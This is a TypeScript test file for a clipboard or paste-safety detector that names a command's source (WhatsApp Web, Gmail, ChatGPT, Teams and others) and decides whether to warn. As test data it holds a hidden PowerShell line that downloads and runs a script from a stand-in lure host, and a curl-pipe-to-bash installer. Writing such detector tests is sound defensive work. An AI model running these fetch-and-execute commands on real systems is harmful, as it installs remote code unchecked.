import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyze, classifySource, explain } from '../src/index.ts';
import type { CustodyRecord } from '../src/types.ts';

const web = (originUrl: string): CustodyRecord => ({ sourceKind: 'browser', originUrl, scriptWritten: false, visibleMatch: true });
const app = (sourceApp: string): CustodyRecord => ({ sourceKind: 'app', sourceApp });

test('names web apps by what people call them', () => {
  assert.deepEqual(classifySource(web('https://web.whatsapp.com/')), { category: 'chat', name: 'WhatsApp Web', host: 'web.whatsapp.com' });
  assert.equal(classifySource(web('https://mail.google.com/mail/u/0/#inbox')).name, 'Gmail');
  assert.equal(classifySource(web('https://outlook.office.com/mail/')).category, 'email');
  assert.equal(classifySource(web('https://chatgpt.com/c/abc')).category, 'ai-chat');
  assert.equal(classifySource(web('https://acme.slack.com/archives/C1')).category, 'web');
  assert.equal(classifySource(web('https://app.slack.com/client/T1/C1')).name, 'Slack');
  assert.equal(classifySource(web('https://example.test/files/guide.pdf')).category, 'pdf');
  assert.equal(classifySource(web('https://learn.microsoft.com/')).category, 'web');
});

test('names desktop apps from the process the agent reports', () => {
  assert.equal(classifySource(app('C:\\Program Files\\WindowsApps\\WhatsApp.exe')).name, 'WhatsApp');
  assert.equal(classifySource(app('olk.exe')).category, 'email');
  assert.equal(classifySource(app('AcroRd32.exe')).category, 'pdf');
  assert.equal(classifySource(app('ms-teams.exe')).name, 'Microsoft Teams');
  assert.deepEqual(classifySource(app('notepad.exe')), { category: 'app', name: 'notepad' });
  assert.equal(classifySource(null).category, 'unknown');
});

test('a source alone never prompts', () => {
  for (const c of [web('https://web.whatsapp.com/'), web('https://mail.google.com/'), web('https://chatgpt.com/'), app('Telegram.exe')]) {
    assert.equal(analyze('git status', { target: 'terminal', custody: c }).action, 'allow');
    assert.equal(analyze('winget install --id Git.Git -e', { target: 'terminal', custody: c }).action, 'allow');
  }
});

test('an official installer from a chatbot answer stays silent', () => {
  assert.equal(analyze('curl -fsSL https://bun.sh/install | bash', { target: 'terminal', custody: web('https://chatgpt.com/c/1') }).action, 'allow');
});

test('the warning names the source in every language', () => {
  const custody = web('https://web.whatsapp.com/');
  const v = analyze('powershell -w hidden -c "iwr https://example-lure.test/a.ps1 | iex"', { target: 'run', custody });
  assert.ok(v.findings.some((f) => f.id === 'from-chat'));
  for (const lang of ['en', 'hi', 'kn'] as const) {
    const e = explain(v, custody, lang);
    assert.ok(e.provenance?.includes('WhatsApp Web (web.whatsapp.com)'), `${lang}: ${e.provenance}`);
    assert.ok(e.details.some((d) => d.includes('WhatsApp Web')), lang);
  }
});
